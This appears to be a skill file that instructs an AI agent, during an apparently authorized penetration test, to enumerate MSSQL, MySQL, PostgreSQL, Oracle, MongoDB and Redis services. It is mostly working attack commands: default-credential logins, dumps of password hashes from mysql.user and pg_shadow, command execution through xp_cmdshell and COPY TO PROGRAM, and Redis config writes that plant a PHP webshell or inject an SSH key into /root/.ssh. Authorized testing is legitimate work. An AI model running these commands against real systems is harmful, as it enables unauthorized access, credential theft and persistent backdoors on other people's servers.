---
name: database-enumeration
description: >
  Database service enumeration and quick-win access checks for MSSQL,
  MySQL, PostgreSQL, Oracle, MongoDB, and Redis. Checks default/empty
  passwords, unauthenticated access, and command execution capabilities.
  Use after network-recon identifies database ports.
keywords:
  - MSSQL
  - MySQL
  - PostgreSQL
  - Oracle
  - MongoDB
  - Redis
  - database enumeration
  - default credentials
  - xp_cmdshell
  - UDF
  - redis unauthenticated
tools:
  - nmap
  - NetExec
  - redis-cli
  - mysql
  - psql
  - mongosh
  - mssqlclient.py
opsec: medium
---

# Database Enumeration

You are helping a penetration tester enumerate database services and check for
quick-win access. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If present, print
`[database-enumeration] Activated → <target>` on activation and save significant
output to `engagement/evidence/` (e.g., `mssql-ntlm-info.txt`).

## Scope Boundary

This skill covers database enumeration and quick-win access checks only.

- **SQL injection** → STOP. Return recommending the appropriate web technique skill.
- **Brute force / password spraying** → STOP. Return recommending **password-spraying**.
- **Post-exploitation via database shell** → STOP. Return with access gained and creds used.

## State Management

Call `get_state_summary()` on activation. Skip services already enumerated.
Leverage any known credentials.

**Interim writes** — write critical discoveries immediately via state-interim:
- Default/empty credentials → `add_credential()`
- Unauthenticated access → `add_vuln(severity="high")`
- Command execution (xp_cmdshell, UDF, COPY PROGRAM) → `add_vuln(severity="critical")`
- Redis unauthenticated → `add_vuln(severity="high")`
- NTLM info leak (domain/hostname) → `add_pivot()`

Report all findings in your return summary as well (orchestrator deduplicates).

## Prerequisites

- Network access to database ports on the target
- Target IP and port list (provided by orchestrator)

## Query Output Handling

When running database queries via interactive shell sessions (send_command /
read_output), large result sets create many round-trip cycles as output arrives
incrementally. For queries that may return more than a few rows, redirect output
to a file on the target and read it once:

```bash
# BAD — inline capture, multiple read_output cycles for large results
mysql -h TARGET -u user -p'pass' -e "SELECT * FROM users;"

# GOOD — write to file, read once
mysql -h TARGET -u user -p'pass' -e "SELECT * FROM users;" > /tmp/db_users.txt 2>&1
wc -l /tmp/db_users.txt  # Check size before reading
cat /tmp/db_users.txt     # Single read

# For very large tables, preview first
mysql -h TARGET -u user -p'pass' -e "SELECT COUNT(*) FROM users;" > /tmp/db_count.txt 2>&1
cat /tmp/db_count.txt
# If >1000 rows, use LIMIT or targeted queries instead of full dump
```

This applies to all database clients (mysql, psql, mssqlclient.py, mongosh).
Clean up temp files when done: `rm /tmp/db_*.txt`.

## Port-Based Execution

The orchestrator passes a port list. **Only run sections for ports that are open
on the target.** Skip all other sections entirely.

## Step 1: MSSQL (Port 1433)

```bash
nmap -sV -p1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password,ms-sql-ntlm-info TARGET_IP

# sa empty/default password checks
netexec mssql TARGET_IP -u sa -p '' --local-auth
netexec mssql TARGET_IP -u sa -p 'sa' --local-auth
netexec mssql TARGET_IP -u sa -p 'password' --local-auth
```

If sa access is gained, check xp_cmdshell:

```bash
mssqlclient.py sa:''@TARGET_IP -windows-auth
# In SQL shell: enable_xp_cmdshell / xp_cmdshell whoami
```

**Interim:** sa creds → `add_credential(service="mssql")` · NTLM info → `add_pivot()` · xp_cmdshell → `add_vuln(severity="critical")`

## Step 2: MySQL (Port 3306)

```bash
nmap -sV -p3306 --script mysql-info,mysql-enum,mysql-empty-password,mysql-vuln* TARGET_IP

# Root empty password
mysql -h TARGET_IP -u root -p'' -e "SELECT user,host,authentication_string FROM mysql.user;"
mysql -h TARGET_IP -u root -e "SELECT user,host,authentication_string FROM mysql.user;"
```

If root access is gained, check for command execution:

```bash
mysql -h TARGET_IP -u root -p'' -e "SELECT @@plugin_dir; SELECT * FROM mysql.func;"
mysql -h TARGET_IP -u root -p'' -e "SHOW GRANTS FOR CURRENT_USER();"
```

**Interim:** root creds → `add_credential(service="mysql")` · UDF/FILE privilege → `add_vuln(severity="critical")`

## Step 3: PostgreSQL (Port 5432)

```bash
nmap -sV -p5432 --script pgsql-brute TARGET_IP
psql -h TARGET_IP -U postgres -d postgres -c "SELECT usename, passwd FROM pg_shadow;"
```

If postgres access is gained:

```bash
psql -h TARGET_IP -U postgres -c "SELECT current_setting('is_superuser');"
psql -h TARGET_IP -U postgres -c "COPY (SELECT '') TO PROGRAM 'id';"
```

**Interim:** postgres creds → `add_credential(service="postgresql")` · trust auth → `add_vuln(severity="high")` · COPY PROGRAM → `add_vuln(severity="critical")`

## Step 4: Oracle (Port 1521)

```bash
nmap -sV -p1521 --script oracle-sid-brute,oracle-tns-version TARGET_IP
odat sidguesser -s TARGET_IP
odat all -s TARGET_IP -p 1521
```

Default credentials: `SCOTT/TIGER`, `SYS/CHANGE_ON_INSTALL`, `SYSTEM/MANAGER`.

**Interim:** default creds → `add_credential(service="oracle")` · DBA access → `add_vuln(severity="critical")`

## Step 5: MongoDB (Port 27017)

```bash
nmap -sV -p27017 --script mongodb-info,mongodb-databases TARGET_IP
mongosh --host TARGET_IP --eval "show dbs"
mongosh --host TARGET_IP --eval "db.adminCommand({listDatabases:1})"
```

**Interim:** unauthenticated access → `add_vuln(name="MongoDB unauthenticated access", severity="high")`

## Step 6: Redis (Port 6379)

```bash
nmap -sV -p6379 --script redis-info TARGET_IP
redis-cli -h TARGET_IP info
redis-cli -h TARGET_IP config get dir
```

If unauthenticated access is confirmed, try RCE via config writes:

```bash
# Webshell write (if web root is writable)
redis-cli -h TARGET_IP <<'REDIS'
config set dir /var/www/html/
config set dbfilename shell.php
set payload "<?php system($_GET['cmd']); ?>"
save
REDIS

# SSH key injection (if /root/.ssh/ is writable)
redis-cli -h TARGET_IP <<'REDIS'
config set dir /root/.ssh/
config set dbfilename authorized_keys
set payload "\n\nssh-ed25519 AAAA... attacker@host\n\n"
save
REDIS

# Check SLAVEOF replication for replication-based RCE
redis-cli -h TARGET_IP info replication
```

**Interim:** unauth access → `add_vuln(severity="high")` · webshell/SSH key written → `add_vuln(severity="critical")`

## Escalate or Pivot

- **Command execution gained** (xp_cmdshell, UDF, COPY PROGRAM, Redis write): STOP.
  Return with access method, recommend shell establishment.
- **Credentials found, no RCE**: STOP. Return credentials for reuse testing.
- **Unauthenticated DB access** (MongoDB, Redis): STOP. Return with access details.
- **No access gained**: Return versions, SIDs, and configs for orchestrator.

## Troubleshooting

### Connection refused / filtered
Note the port as filtered and move to the next service.

### MySQL authentication plugin errors
Try `--default-auth=mysql_native_password` for `caching_sha2_password` errors.

### psql: FATAL: no pg_hba.conf entry
PostgreSQL rejects connections from this IP. Note as blocked (not retryable).

### odat not installed
Return to orchestrator. Oracle enumeration limited to nmap NSE without odat.

### redis-cli NOAUTH
Redis requires auth. Try `redis`, empty string, `password`. If all fail, move on.
